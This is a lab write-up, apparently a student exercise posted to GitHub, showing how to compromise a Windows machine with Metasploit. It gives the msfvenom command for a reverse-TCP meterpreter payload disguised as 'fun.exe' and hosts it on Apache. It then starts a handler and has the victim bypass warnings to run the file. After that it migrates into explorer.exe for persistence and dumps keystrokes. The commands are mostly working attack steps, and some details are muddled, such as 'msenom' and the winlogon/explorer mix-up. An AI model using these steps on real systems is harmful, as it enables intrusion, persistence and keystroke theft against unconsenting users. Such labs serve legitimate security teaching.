# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

# program:
Find the attackers ip address using ifconfig

# OUTPUT:
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/c7506af8-dcfc-479d-b9ad-c6cdc46dc592)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/1578b1c8-17f6-43f0-9719-cb618319c915)


copy the fun.exe into the apache /var/www/html folder 
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/2f628641-af6f-4735-ae7f-0cd79139df96)


Start apache server sudo systemctl apache2 start

# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/9d055888-253c-4747-b891-3617c562762d)



Check the status of apache2 
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/168c5fb2-3306-4eb0-be8f-9685cf542500)


# Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/4d8e06f7-ab07-4481-8687-70dd289327fc)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/2f71d107-4226-41d5-8fcd-737d1d31f671)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/5ff3917c-2ce4-4eb2-9100-9ef0f8e1c8f6)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/4013ba6a-94a1-43cb-b0e3-5652c7088ed1)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/6d8bf471-6b04-4db5-bc8e-1731b07b14d7)


keyscan_dump Shows the keystrokes captured so far 
# ![image](https://github.com/Roselineb/Compromising-windows-using-Metasploit/assets/128909895/58b0c117-aab0-4bbd-b11e-461b9dc7bffe)




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
